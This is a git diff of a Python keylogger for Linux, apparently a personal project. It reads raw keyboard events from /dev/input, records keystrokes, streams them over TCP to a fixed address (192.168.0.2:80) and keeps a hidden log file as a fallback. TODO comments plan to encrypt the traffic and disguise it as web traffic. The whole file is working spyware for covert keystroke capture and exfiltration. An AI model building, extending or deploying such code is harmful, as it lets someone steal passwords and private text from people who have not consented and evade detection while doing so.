@@ -9,8 +9,8 @@ Compiled with XYZ for ease of use in demonstrations.
 Written by mowemcfc (jcartermcfc@gmail.com) starting 12/06/2020
 """
 
-THIS_ADDR = ("192.168.0.2", 80) # This port may not always be open
-                                # TODO: check multiple ports? configure host for this too
+RETURN_ADDR = ("192.168.0.2", 80) # This port may not always be open
+                                  # TODO: check multiple ports? configure host for this too
 
 """
 Find character device file associated with keypress events using regex and device information
@@ -18,6 +18,7 @@ Find character device file associated with keypress events using regex and devic
 
 # TODO: dynamic pathfinding to account for different filesystem structures
 def get_kb_cfile():
+
     with open("/proc/bus/input/devices", "r") as f: # this file contains current device information, including the keyboard
         lines = f.readlines()
 
@@ -34,12 +35,29 @@ def get_kb_cfile():
         print(line)
 
         pattern = re.compile("event\d?[0-9]|[1-9]0")
-        infile_path = "/dev/input/" + pattern.search(line).group(0) # find character device file event#
+        cfile_path = "/dev/input/" + pattern.search(line).group(0) # find character device file event#
 
-        print(infile_path)
         f.close()
 
-    return infile_path
+    return cfile_path
+
+"""
+Takes name of logfile as input, and sends contents over TCP connection.
+Clears file's contents after read.
+"""
+
+def send_logfile(sock, logfile_name, typed):
+    with open(logfile_name, "r+") as outf:
+        outf.write(typed)
+        data = outf.readlines()
+        outf.truncate(0)
+        outf.close()   
+
+    if data:
+        sock.sendall(encode(data))
+
+    return
+
 
 """
 Opens special character file associated with keyboard events, reads struct and writes to output file.
@@ -54,9 +72,14 @@ Struct format {struct input_event} is as follows (for 64bit linux systems):
 	    __s32 value;
     }
 """
-
+# TODO: encrypt outgoing data
+# TODO: mask connection as web server with http
 # TODO: IF CONN NOT AVAILABLE, WRITE TO LOGFILE AND SEND WHEN ESTABLISHED, OTHERWISE STREAM KEYPRESSES TO SERV
 def read_cfile(cfile_path):
+    logfile_name = ".log.txt"
+
+    inevent_format = 'llHHI'
+    struct_size = struct.calcsize(inevent_format)
 
     # dict of code:key pairs corresponding to keyboard entry codes found in /include/linux/input-event-codes.h
     # TODO: by-country keyboard layout, need way to determine location? 
@@ -76,40 +99,65 @@ def read_cfile(cfile_path):
         87: "[F11]", 88: "[F12]"
     }
 
-    format = 'llHHI'
-    struct_size = struct.calcsize(format)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.connect(RETURN_ADDR)
+    except:
+        pass
 
     input_file = open(cfile_path, "rb")
-
     keypress = input_file.read(struct_size)
+
     typed = ""
-
-    if not os.path.exists(".log.txt"): # create hidden log file
-        logfile = open(".log.txt", "w")
-        logfile.close()
-
     while keypress:
-        (var1, var2, type, code, value) = struct.unpack(format, keypress)
+        (var1, var2, type, code, value) = struct.unpack(inevent_format, keypress)
         print(var1, var2, type, code, value)
 
-        if code != 0 and type == 1 and value == 1:
+        if sock.fileno() == -1: # If socket is not connected, attempt to reconnect, otherwise ignore - data will be written to file
+            try:
+                sock.connect(RETURN_ADDR)
+            except:
+                pass
+
+        if code != 0 and type == 1 and value == 1: # TODO: write this comment
             if code in qwerty_map:
                 typed += qwerty_map[code]
 
         keypress = input_file.read(struct_size)           
-        if len(typed) == 32: # write to file every 32 characters,
-            with open(".log.txt", "a") as outfile:
-                outfile.write(typed)
-                typed = ""
+        if len(typed) == 128: # write to file every 128 characters TODO: should this be higher?
+            try:
+                if log_needs_send:
+                    send_logfile(sock, logfile_name, typed)
+                    log_needs_send = False
+                else:
+                    sock.sendall(encode(typed)) # encode keypress data as utf-8 string (by default)
+            except:
+                log_needs_send = True
+
+                if not os.path.exists(logfile_name): # create hidden log file
+                    logfile = open(logfile_name, "w")
+                    logfile.close()
+
+                with open(logfile_name, "a") as outf:
+                    outf.write(typed)
+                    typed = ""
+                    outf.close()
+
+
+    
+    
 
 """
 Establishes TCP connection with host computer, takes (HOST, PORT) tuple as input
 """
 
+"""
 # Let's leave this to work with only local devices for now
 # TODO: configure this to work with remote computers, requires particular configurations on local network first
 def establish_return_conn():
-    return_addr = ("")
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(RETURN_ADDR)
+"""
 
 def main():
     cfile_path = get_kb_cfile()
